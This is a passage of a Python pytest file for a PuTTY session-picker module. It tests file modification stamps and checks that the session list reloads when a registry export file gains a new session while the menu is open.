    def test_file_stamp_changes_on_write(self, tmp_path):
        f = tmp_path / "x.reg"
        f.write_text("a", encoding="utf-8")
        s1 = putty.file_stamp(f)
        import os
        os.utime(f, ns=(s1[1] + 10**6, s1[1] + 10**6))
        s2 = putty.file_stamp(f)
        assert s1 != s2

    def test_file_stamp_missing_file(self, tmp_path):
        assert putty.file_stamp(tmp_path / "nope") is None

    def test_main_reloads_when_reg_changes(self, monkeypatch, tmp_path, capsys):
        """Simulate: menu opens, reg file gains a session mid-loop, and the
        next pick call must receive the reloaded session dict."""
        reg = tmp_path / "live.reg"
        reg.write_text(
            '[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\first]\n'
            '"HostName"="a.example.com"\n', encoding="utf-8")
        monkeypatch.setenv("PUTTY_REG_PATH", str(reg))
        monkeypatch.setattr(Path, "home", lambda: tmp_path)

        seen_usable = []

        def pick_and_mutate(usable, *a, **k):
            seen_usable.append(dict(usable))
            if len(seen_usable) == 1:
                # mutate the reg file with a fresh mtime while menu is open
                reg.write_text(
                    '[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\first]\n'
                    '"HostName"="a.example.com"\n\n'
                    '[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\second]\n'
                    '"HostName"="b.example.com"\n', encoding="utf-8")
                import os
                stamp = putty.file_stamp(reg)
                os.utime(reg, ns=(stamp[1] + 10**9, stamp[1] + 10**9))
                return "first"  # choose ACTION_BACK path
            return None  # cancel on second pass

        monkeypatch.setattr(putty, "pick_session_interactive", pick_and_mutate)
        monkeypatch.setattr(putty, "pick_action", lambda *a, **k: putty.ACTION_BACK)

        err = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), \
                contextlib.redirect_stderr(err):
            rc = putty.main(["--no-tui"])

        assert rc == 0
        assert "second" not in seen_usable[0]     # first snapshot: before
        assert "second" in seen_usable[1]         # reloaded: after
        assert ".reg file changed" in err.getvalue()
